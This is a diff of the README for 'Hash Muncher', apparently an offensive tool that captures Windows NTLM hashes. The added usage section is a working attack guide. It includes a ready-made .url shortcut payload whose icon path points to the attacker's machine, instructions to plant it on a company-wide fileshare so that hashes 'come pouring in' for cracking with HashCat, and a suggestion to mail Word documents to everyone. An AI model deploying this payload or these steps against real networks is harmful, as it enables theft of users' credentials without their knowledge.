@@ -35,15 +35,34 @@ cd hashmuncher
 
 ## Usage
 
+1) Ensure that Windows Firewall allows "File and Printer Sharing" as Hash Muncher requires the built in SMB service to send recieve the initial request and send response packets to the target.
+
+![](images\2023-05-09-12-02-27.png)
+
+2) In an elevated prompt run Hash Muncher
+
 ```bash
 hashmuncher.exe [-output filename.txt] [-timeout nnn] [-tracename yourname] [-help]
 ```
 
-Now wait for someone to authenticate against your machine. There are various techniques for this but SCF and LNK files with icons pointing to your machine is a popular way. Press Ctrl-C when you're done, copy output to a text file and run HashCat.
+3) Now wait for someone to authenticate against your machine, or plant an URL shortcut on a popular shared fileshare like below.
+
+
+````
+[InternetShortcut]
+URL=Munch
+WorkingDirectory=MunchMunch
+IconFile=\\10.1.2.3\%USERNAME%.icon
+IconIndex=1
+````
+
+Replace the IP address with your Hach Muncher machine, and save the file to a (company wide) fileshare as 'whatever.url', and watch the hashes come pouring in.
+
+There are other methods mentioned at [Red Team Notes - Forced Authentication](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication>), and you can probably also get success by mailing everyone a Word document, but it's not stealthy at all.
 
 ## Detection
 
-- None so far
+- None that I've seen, but please leave feedback
 
 ## Mitigation
 
